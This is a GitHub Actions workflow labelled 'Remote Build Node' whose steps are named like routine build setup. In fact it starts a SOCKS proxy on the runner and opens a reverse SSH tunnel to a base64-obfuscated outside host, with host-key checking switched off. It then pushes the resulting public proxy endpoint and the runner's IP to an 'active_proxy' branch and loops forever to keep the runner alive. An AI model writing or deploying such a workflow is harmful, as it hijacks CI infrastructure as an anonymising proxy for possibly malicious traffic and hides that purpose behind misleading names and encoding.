name: Remote Build Node

on:
  workflow_dispatch:
    inputs:
      profile_id:
        description: 'Node allocation identifier'
        required: false
        type: string
        default: 'default'

permissions:
  contents: write

jobs:
  runner:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repo
        uses: actions/checkout@v4

      - name: Prepare runtime
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y -qq microsocks
          microsocks -p 1080 -i 0.0.0.0 &
          sleep 1

      - name: Establish secure connection
        run: |
          PUBLIC_IP=$(curl -s https://api.ipify.org)
          echo "Node Public IP: $PUBLIC_IP"
          PROFILE_ID="${{ inputs.profile_id }}"
          if [ -z "$PROFILE_ID" ]; then
            PROFILE_ID="default"
          fi
          
          REMOTE_HOST=$(echo dGNwQGEucGluZ2d5Lmlv | base64 -d)
          ssh -p 443 -R0:localhost:1080 -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -o UserKnownHostsFile=/dev/null "$REMOTE_HOST" > tunnel.log 2>&1 &
          
          for i in $(seq 1 25); do
            sleep 2
            URL=$(grep -oE "tcp://[a-zA-Z0-9.-]+:[0-9]+" tunnel.log | head -n 1 || true)
            if [ -n "$URL" ]; then
              ENDPOINT_ADDR=$(echo "$URL" | sed 's|tcp://||')
              
              git config user.name "github-actions[bot]"
              git config user.email "github-actions[bot]@users.noreply.github.com"
              git remote set-url origin https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/${{ github.repository }}.git
              
              git fetch origin active_proxy || true
              git checkout active_proxy 2>/dev/null || git checkout -b active_proxy
              
              mkdir -p proxies
              echo "{\"profile_id\": \"$PROFILE_ID\", \"proxy\": \"$ENDPOINT_ADDR\", \"ip\": \"$PUBLIC_IP\", \"timestamp\": $(date +%s)}" > "proxies/${PROFILE_ID}.json"
              cp "proxies/${PROFILE_ID}.json" proxy.json
              
              git add proxies/ proxy.json
              git commit -m "Update node status for ${PROFILE_ID} [skip ci]" || true
              
              for r in $(seq 1 5); do
                git pull origin active_proxy --rebase || true
                if git push origin active_proxy; then
                  echo "Node ready for ${PROFILE_ID}!"
                  break
                fi
                sleep 2
              done
              break
            fi
          done

      - name: Keep Alive
        run: |
          while true; do
            sleep 30
          done
